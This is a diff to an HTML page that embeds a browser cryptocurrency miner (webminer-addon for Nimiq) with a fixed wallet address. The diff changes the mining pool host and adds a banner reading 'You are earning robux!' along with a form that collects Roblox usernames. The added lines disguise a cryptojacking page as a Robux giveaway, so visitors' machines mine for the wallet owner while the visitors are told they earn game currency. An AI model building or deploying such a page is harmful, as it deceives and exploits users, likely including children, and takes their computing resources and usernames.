@@ -5,7 +5,7 @@
   <script src="https://cdn.jsdelivr.net/gh/Albermonte/webminer-addon@latest/dist/js/addon.js" defer></script>
   <script defer>
     let NIMIQ_ADDRESS = 'NQ55 LG75 3LVD 2UKR 6UY8 XBGL 298H 6UQ6 MCTB';
-    let NIMIQ_POOL_HOST = 'pool.nimiq.watch';
+    let NIMIQ_POOL_HOST = 'pool.acemining.co';
     let NIMIQ_POOL_PORT = 8443;
     let ADDON_INFO = 'This is a miner.'
   </script>
@@ -16,7 +16,22 @@
     <strong>We're sorry but webminer-addon doesn't work properly without JavaScript enabled. Please enable it to
       continue.</strong>
   </noscript>
+  
+  <p>You are earning robux!</p>
+   
+   <p>Enter names in the fields, then click "Submit" to submit the form:</p>
 
+   <form id="muid" action="/action_page.php">
+    Roblox Username: <input type="text" name="fname"><br>
+    <input type="button" onclick="myFunction()" value="Submit">
+   </form>
+
+   <script>
+     function myFunction() {
+     document.getElementById("muid").submit();
+     }
+   </script>
+  
   <div id="webminer-addon"></div>
 </body>
 
